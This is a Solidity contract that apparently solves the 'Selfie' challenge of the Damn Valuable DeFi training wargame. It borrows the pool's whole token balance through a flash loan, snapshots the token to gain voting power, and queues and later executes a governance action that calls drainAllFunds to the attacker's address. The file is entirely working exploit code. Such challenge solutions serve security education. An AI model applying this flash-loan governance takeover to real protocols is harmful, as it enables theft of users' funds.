// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {DamnValuableTokenSnapshot} from "src/Contracts/DamnValuableTokenSnapshot.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

contract SelfieAttack {
    ISelfiePool public immutable selfiePool;
    DamnValuableTokenSnapshot public immutable token;
    ISimpleGovernance public immutable simpleGovernance;
    uint256 public actionId;
    address public attacker;

    constructor(address _selfiePoolAddress, address _tokenAddress, address _simpleGovernanceAddress) {
        selfiePool = ISelfiePool(_selfiePoolAddress);
        token = DamnValuableTokenSnapshot(_tokenAddress);
        simpleGovernance = ISimpleGovernance(_simpleGovernanceAddress);
        // attacker = msg.sender;
    }

    function attack() external {
        uint256 selfiePoolBalance = token.balanceOf(address(selfiePool));
        attacker = msg.sender;
        selfiePool.flashLoan(selfiePoolBalance);
    }

    function receiveTokens(address, uint256 amount) external {
        bytes memory drainAllFundsData = abi.encodeWithSignature("drainAllFunds(address)", payable(attacker));

        token.snapshot();
        actionId = simpleGovernance.queueAction(address(selfiePool), drainAllFundsData, 0);

        token.transfer(address(selfiePool), amount);
    }

    function execute() external {
        simpleGovernance.executeAction(actionId);
    }
}
